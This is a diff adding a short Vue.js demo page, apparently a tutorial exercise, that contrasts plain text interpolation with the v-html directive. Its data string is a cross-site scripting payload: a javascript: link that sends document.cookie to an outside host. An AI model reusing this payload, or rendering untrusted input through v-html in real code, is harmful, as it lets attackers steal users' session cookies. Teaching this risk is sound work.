@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="../lib/vue.js"></script>
+</head>
+
+<body>
+    <div id="box">
+        <!-- 不执行 html 标签解析 -->
+        {{ message }}
+
+        <!-- v-html 解析 html 指令 -->
+        <div v-html="message"></div>
+    </div>
+    <script>
+        new Vue({
+            el: '#box',
+            data: {
+                message: "<a href=javascript:location.href='https://www.baidu.com?cookie='+document.cookie>click</a>"
+            }
+        })
+    </script>
+</body>
+
+</html>
